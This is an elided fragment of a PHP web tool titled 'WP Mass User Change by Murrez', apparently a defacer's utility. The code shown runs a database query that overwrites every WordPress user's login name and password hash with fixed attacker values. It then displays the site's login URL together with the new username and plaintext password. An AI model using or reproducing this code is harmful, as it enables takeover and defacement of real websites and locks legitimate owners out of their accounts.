...
<body>
<center>
<center><p class="heading">WP Mass User Change by Murrez</p></center>
<br /><br />
<form method="post">
...
} $query2 = mysqli_query($connect,"update ".$prefix."users set user_login='murrezsex',user_pass='071f7dfde36326f5057f46735fc72a12'"); 
if($query2){ 
echo "<center><span class=f>URL : <a href='$site_url/wp-login.php' target='_blank'>$site_url/wp-login.php</a><br><br>UserName : murrezsex<br><br>Password : mürrezdefacer<br><br></span></center>"; } } } } 
?>
</body>
</html>